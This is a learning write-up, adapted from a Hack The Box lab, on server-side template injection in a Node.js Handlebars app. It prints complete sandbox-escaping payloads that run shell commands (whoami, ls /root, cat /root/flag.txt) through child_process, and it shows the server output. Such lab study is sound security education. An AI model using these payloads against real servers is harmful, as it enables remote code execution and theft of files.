# Server Side Template Injection (SSTI)

Note: This cookbook reflects and analyzes what I’ve learned from an HTB machine showcasing an SSTI vulnerability. While the official write-up (prepared by "pwninx") is excellent, I prefer to organize and internalize this knowledge in my own way.

From the official HTB write-up: *This example focuses on the exploitation of a Server Side Template Injection vulnerability identified in Handlebars, a template engine in Node.js. This walkthrough will demonstrate how to exploit an SSTI in a web server, when the developer doesn't sanitise user input correctly.*

*Upon visiting port 80 on the target machine, we are presented with a webpage that is currently under construction and the option to subscribe to updates about the page using an email address. An email subscription in web pages is usually an option that allows web visitors to receive updates via email, regarding the status of the website or the company or individual that owns it.*

*Let's provide a test email to verify we have a working application. When given an application to test, use it as if you are using it intendedly. Sometimes, developers put in poor code as a quick solution, leading to vulnerabilities. Let's input the email pwninx@hackthebox.eu and click submit.*

*The output shows that any input that is submitted in the Email field gets reflected back to the user once the page reloads. This could lead us down a trail of thinking about various potential exploitation vectors such as Cross Site Scripting (XSS), however, we first need to know what frameworks and coding languages the website uses for its backend.*

*In this instance we have a pretty good rundown of the server backend from the Nmap report on port 80, however, we can also use a helpful extension called Wappalyzer, which scans the website and finds information the web page is using, such as Web Frameworks, JavaScript Frameworks, Web Servers, Programming Languages, Widgets and many more...*

*Both Nmap and Wappalyzer have reported that the server is built on Node.js and is using the Express framework.*

*Node.js is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build scalable network applications. Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications.*

*With this information in mind we can start identifying potential exploitation paths. Various attempts at verifying an XSS vulnerability with default payloads, such as ```<script>alert(1)</script>```, have been unsuccessful. For this reason we must look for a different vulnerability.*

*Template Engines are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client (i.e. a user opening a page through their browser).*

*Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server. To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server. This attack is very common on Node.js websites and there is a good possibility that a Template Engine is being used to reflect the email that the user inputs in the contact field.*

## Identification

To exploit a potential SSTI vulnerability, we first need to confirm its existence. The official write-up recommends [this resource](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), which provides a detailed explanation. Additionally, the [PayloadsAllTheThings repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) offers a wealth of knowledge on the subject.

Next, the following diagram illustrates how to identify an SSTI vulnerability and determine which template engine is being used. Once the engine is identified, a more specific payload can be crafted to enable remote code execution:

![Server-Side Template Injection Workflow](https://raw.githubusercontent.com/PurityControl7/cookbooks/2bc73b605b7508b871d2ab51fbb5c39cb93e553d/MISCELLANEOUS/SSTI.png)

The [Identify paragraph](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) in the aforementioned Hacktricks page shows a variety of special characters commonly used in template expressions.

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

The official write-up then states: *Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities. If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code and attempt to execute them, in this instance calculating the mathematical equation ```7*7``` (Seven multiplied by Seven), which is equal to 49.*

*To test for the vulnerability lets try inputting ```${7*7}``` into the email submission form.*

*The server did not execute the expression and only reflected it back to us. Let's move on to the second payload, which is ```{{7*7}}```. After the payload is submitted, an error page pops up.*

*This error (omitted here) means that the payload was indeed detected as valid by the template engine, however the code had some error and was unable to be executed. An error is not always a bad thing. On the contrary for a penetration tester, it can provide valuable information. In this case we can see that the server is running from the ```/root/Backend``` directory and also that the Handlebars Template Engine is being used.*

## Exploitation

The next section on the official write-up focuses on the exploitation: *Looking back at Hacktricks page we have researched, we can see that both Handlebars and Node.js are mentioned, as well as a payload that can be used to potentially run commands on a Handlebars SSTI. To determine if this is the case, we can use Burpsuite to capture a POST request via FoxyProxy and edit it to include our payload.*

Next, there's a screenshot (omitted here) showing the Proxy → Intercept tab in Burp Suite with the captured raw request. The key detail to focus on is the email parameter, where we’ll insert the payload discussed below. Here is the email parameter:

```
(...)
Email=%7B%7(...)&action=submit
```

And now back to the official write-up: *Before we modify the request, let's send this HTTP packet to the Repeater module of BurpSuite by pressing CTRL+R . Now let's grab a payload from the section that is titled "Handlebars (NodeJS)" in the HackTricks website.*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

The official write-up didn't try to explain this code, so here is what I have managed to learn about it:

1. Handlebars Context Manipulation: The payload uses Handlebars' ```#with``` helper to create and manipulate context variables. It starts by assigning the string "s" to a variable called ```string```. This allows us to work with string methods within Handlebars.

2. Building and Manipulating Arrays: The payload creates a list (using the ```split``` method) and manipulates it by pushing and popping elements. This manipulation is used to gain access to the underlying JavaScript methods within the template engine, specifically, the constructor of the ```String``` object.

3. Code Injection: By pushing custom JavaScript code into the ```split``` method's array, the payload injects a ```require('child_process').exec('whoami');``` command into the context. This command tells the server to execute the ```whoami``` shell command, which returns the current user's name.

4. Execution: Finally, the payload iterates through the list (```conslist```), and each time it executes the injected code, it triggers the ```whoami``` command on the server.

Additional clarifications:

- Helpers: In Handlebars, helpers are functions that can be called from within templates to perform actions or manipulate data. They allow for more complex logic than just simple template rendering. In this payload, ```#with``` is a built-in helper that changes the context within the block it encloses.

- Context Variables: These are variables that are available within the scope of a template. Handlebars allows you to define and manipulate these variables, which can then be used to control the output or inject logic. The ```as |variable|``` syntax in ```#with``` is how you create a new context variable.

- Split Method: The split method in JavaScript is typically used to split a string into an array of substrings based on a specified delimiter. However, in this payload, it’s being exploited to manipulate the array and ultimately insert malicious code. This method is crucial in getting the payload to execute code rather than just handling strings.

- Pushing and Popping: These methods are array operations in JavaScript. ```push``` adds an element to the end of an array, while ```pop``` removes the last element. In the payload, these operations are used to dynamically alter the array, inserting and removing elements strategically to build and execute a command.

- Lookup and Constructor: The ```lookup``` function in Handlebars retrieves the value of a property from a specific object in the context. In this payload, it’s used to access the ```constructor``` property, which is how JavaScript objects are built. By accessing the constructor, the payload gains the ability to execute arbitrary JavaScript code.

However, in the official write-up our main focus will be the following line:

```
{{this.push "return require('child_process').exec('whoami');"}}
```

*This line instructs the server to execute a specific system command (in this case whoami). Later in the write- up we will be modifying this line to execute different commands on the server. After copying the full payload from Hacktricks, we must URL encode it so that it will be correctly passed to the server.*

## URL Encoding

*When making a request to a web server, the data that we send can only contain certain characters from the standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For this reason we use an encoding procedure that is called URL Encoding.*

*With this process for instance, the reserved character ```&``` becomes ```%26```. Luckily, BurpSuite has a tab called ```Decoder``` that allows us to either decode or encode the text of our choice with various different encoding methods, including URL.*

*Let's paste the above payload into the top pane of the Decoder and select ```Encode as``` > ```URL```.*

*Copy the URL encoded payload that is in the bottom pane and paste it in the ```email=``` field via the ```request``` tab.*

*Next, let's try sending the payload by clicking on the orange "Send" button in the top.*

*The response shows an error that states ```require is not defined```. Taking a look at the payload we notice the following code:*

```
{{this.push "return require('child_process').exec('whoami');"}}
```

*This is likely the part of the payload that is erroring out. ```require``` is a keyword in Javascript and more specifically Node.js that is used to load code from other modules or files. The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case whoami).*

*Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use ```require``` to load such modules, we will have to find a different way.*

## Globals

The next section is also borrowed out of the official HTB write-up:

*In computer programming "Globals" are variables that are globally accessible throughout the program. In Node.js this works similarly, with Global objects being available in all loaded modules. A quick Google search using the keywords ```Node.js Global Scope``` reveals [this](https://nodejs.org/api/globals.html) documentation that details all of the available Global Objects in Node.js. It is worth noting that the [documentation](https://nodejs.org/api/globals.html#global-objects) also showcases a list of variables that appear to be global objects, but in fact are [built-in](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects) objects. These are the following:*

```
__dirname
__filename
exports
module
require()
```

*As seen from the list, require is in fact not in the global scope and therefore in specific cases it might not be accessible. Taking a closer look at the documentation we see that there is a [process](https://nodejs.org/api/process.html#process) object available. The documentation states that this object "provides information about, and control over, the current Node.js process". We might be able to use this object to load a module. Let's see if we can call it from the SSTI. Modify your payload as follows:*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Notes: As we can see, the key difference between this (the second) payload and the first one lies in the line that pushes ```"return process;"``` instead of ```"return require('child_process').exec('whoami');"```. This change is a step toward escaping the sandbox environment.

The ```process``` object in Node.js is a global object that provides information and control over the current Node.js process. By injecting ```"return process;"```, this payload attempts to gain access to the process object, which can then be used to break out of the template engine's sandbox, potentially giving access to sensitive system-level information or control over the execution environment.

Unlike the first payload, which attempts to directly execute a command (whoami), this modified payload is focused on accessing the process object itself. Once this object is accessed, it can be leveraged for further exploitation, such as spawning a new shell or manipulating the environment.

And now back to the official write-up: *URL encode the payload as shown previously and send it using BurpSuite Repeater. Here is the result:*

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object process]
```

*The response did not contain an error and we can see the ```[object process]``` has been included. This means that the process object is indeed available.*

*Taking a closer look at the [documentation](https://nodejs.org/api/process.html) of the process object, we see that it has a [mainModule](https://nodejs.org/api/process.html#processmainmodule) property that has been deprecated since version 14.0.0 of Node.js, however, deprecated does not necessarily mean inaccessible. A quick Google search using the keywords "Node.js mainModule" reveals this [blog post](https://www.geeksforgeeks.org/node-js-process-mainmodule-property/) that details the usage of this property.*

*Specifically, it mentions that this property returns an object that contains the reference of main module. Since handlebars is running in a sandboxed environment, we might be able to use the ```mainModule``` property to directly load the main function and since the main function is most probably not sandboxed, load ```require``` from there. Let's modify our payload once more to see if ```mainModule``` is accessible.*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

In the second payload, the focus was on accessing the ```process``` object. This was an important step because it allowed us to interact with the environment outside of the template engine's sandbox, but it was still restricted to the sandboxed ```process``` object.

In this (the third) payload, the strategy evolves to access the ```mainModule``` property of the ```process``` object. The ```mainModule``` refers to the main module that was loaded when the Node.js application started. By gaining access to ```mainModule```, we're likely bypassing the sandbox, since ```mainModule``` can provide access to the main program's scope, including the ability to load other modules (via ```require```) that might not be sandboxed.

The modification changes the line that was returning ```process``` to now return ```process.mainModule```, which aims to break out of the restricted environment entirely by leveraging the main module's broader permissions. This is a significant step up from the previous payload, as it potentially opens the door to unrestricted code execution on the server.

This move from ```process``` to ```process.mainModule``` is key because it shifts the scope of what we can control, aiming for deeper system access by targeting a core part of the application's execution context. From here, we could further explore how to load the ```require``` function directly, which might eventually lead to executing arbitrary commands, or even establishing a reverse shell.

After this digression I am returning to what the official write-up has to say: *URL encode the payload and send it using the Repeater module as shown previously. The following response is returned:*

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object Object]
```

*No error this time either and we see an extra object at the end of the response, which means the property is indeed available. Now lets attempt to call ```require``` and load a module. We can load the ```child_process``` module as it is available on default Node.js installations and can be used to execute system commands. Modify the payload as follows:*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

In the third payload, we managed to retrieve the ```mainModule``` property of the ```process``` object. This was a pivotal step because it hinted that we might be able to access core functionalities of the Node.js application, outside the restricted environment.

The newest, fourth payload builds on that success by attempting to use the ```require``` function from the ```mainModule``` object. Specifically, it tries to load the ```child_process``` module, which is a built-in Node.js module that allows for the execution of system commands. This is a crucial leap forward because it potentially enables command execution on the target system.

Here's what changed:

From ```process.mainModule``` to ```process.mainModule.require('child_process')```: The third payload simply returned the ```mainModule``` object, confirming it was accessible. The fourth payload takes the next logical step by invoking ```require``` on ```mainModule``` to load the ```child_process``` module, which is a powerful tool for interacting with the operating system.

By loading ```child_process```, we can now execute system commands directly from this payload. This gives us a lot more control, potentially allowing for remote code execution (RCE), which is one of the most sought-after outcomes when exploiting SSTI vulnerabilities.

In summary, while the third payload was about verifying access to a critical part of the Node.js runtime, the fourth payload takes action based on that access, attempting to load a module that could let us execute arbitrary commands. This step is moving us closer to a full exploit, where we might soon be able to execute commands on the target server—possibly leading to a reverse shell.

And now back to the official write-up: *After URL encoding and sending the payload, we get the following response from the server:*

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object Object]
```

*The ```require``` object has been called successfully and the ```child_process``` module loaded. Let's now attempt to run system commands:*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Payload number five is a direct evolution of payload number four. The main difference is in the action that is performed after accessing the ```child_process``` module.

In payload number four, we simply loaded the ```child_process``` module, which laid the groundwork for executing commands. Payload number five takes this a step further by actually using the ```execSync``` method from the ```child_process``` module to run the ```whoami``` command on the system. This is significant because it demonstrates the ability to execute commands synchronously and retrieve their output, which is a crucial step in exploitation.

Back to the write-up again: *We will need to URL encode the above payload once again. Copy the payload in the bottom pane and paste it into the ```email=``` field once more, replacing the previous. Finally, click on the "Send" button.*

*In the response we see that the output of the ```whoami``` command is ```root```. This means that we have successfully run system commands on the box and also that the web server is running in the context of the root user. We can now proceed one of two ways. We can either get a Reverse Shell on the affected system, or directly grab the flag. In this writeup we will focus on the latter.*

*We know that the flag is most probably located in ```/root``` but we can also verify this. Let's change our command from ```whoami``` to ```ls /root``` to list all files and folders in the root directory:*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

*URL encode the payload and send it as shown before. In the response we see the following:*

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
Backend
flag.txt
snap
```

*The flag is indeed in ```/root``` and is called "flag.txt". Let's modify our payload in order to read it:*

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

*The flag is shown in the server response and can be copied and pasted to the Hack The Box platform:*

```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
6b******************************
```

This concludes the demonstration of an SSTI vulnerability.

## Additional comments about syntax in the final payload

- ```{{#with ...}}```: This is a block helper that creates a new context. The variable defined in the with statement is accessible within that block.

- ```{{this.pop}}``` and ```{{this.push ...}}```: These are methods being called on the this context, which is a list or array. pop removes the last item from the list, and push adds an item to the end of the list.

- ```{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}```: This line is injecting a payload that will execute a shell command on the server, specifically reading the content of a file (```/root/flag.txt```).

- ```{{string.sub "constructor"}}```: This is accessing the ```constructor``` property of the string ```object```, which is part of JavaScript's object model. This is typically used to manipulate or access the internal structures of the JavaScript engine for exploitation purposes.

- ```{{this.push "return ..."}}```: Here, we're adding a string that contains a JavaScript expression to the list. When executed, this expression will run on the server, executing the command and potentially retrieving sensitive information.

- ```{{#each conslist}} ... {{/each}}```: This iterates over the conslist, which was previously constructed, and applies some transformation or extraction logic.
